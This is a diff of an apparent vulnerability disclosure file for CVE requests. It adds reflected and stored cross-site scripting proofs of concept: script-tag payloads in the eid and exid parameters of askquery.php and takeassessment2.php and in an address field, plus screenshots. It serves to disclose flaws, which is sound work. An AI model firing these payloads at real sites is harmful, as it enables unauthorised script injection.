@@ -53,7 +53,7 @@ ___
 # XSS
 
 ## CVE Request 1928476:
-Poc XSS:
+Poc XSS Reflect:
 - /askquery.php?eid="><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
 
 <img width="1038" height="732" alt="image" src="https://github.com/user-attachments/assets/3c33a43b-084e-4768-8b60-ca1d8712e129" />
@@ -63,7 +63,7 @@ Poc XSS:
 ___
 
 ## CVE Request 1928478:
-Poc XSS:
+Poc XSS Reflect:
 
 - /takeassessment2.php?exid=6"><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
 
@@ -71,7 +71,20 @@ Poc XSS:
 
 <img width="1393" height="221" alt="image" src="https://github.com/user-attachments/assets/49e39a7d-e4d8-4297-ab41-9f2cc4c8641d" />
 
+___
 
+## 
+Poc XSS Storage:
+
+- Addres: "><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
+
+<img width="1831" height="847" alt="image" src="https://github.com/user-attachments/assets/acacc85d-9155-4046-a299-ac7dd0b8282e" />
+
+<img width="1337" height="192" alt="image" src="https://github.com/user-attachments/assets/6ab18c68-70e1-4c0c-8d6e-7aa4c0964f2a" />
+
+<img width="1333" height="230" alt="image" src="https://github.com/user-attachments/assets/71ac925f-44ba-42f7-868b-30ba888f6739" />
+
+<img width="1849" height="1203" alt="image" src="https://github.com/user-attachments/assets/aecb003d-8bb0-44fa-bf99-19938947ab33" />
 
 ___
 
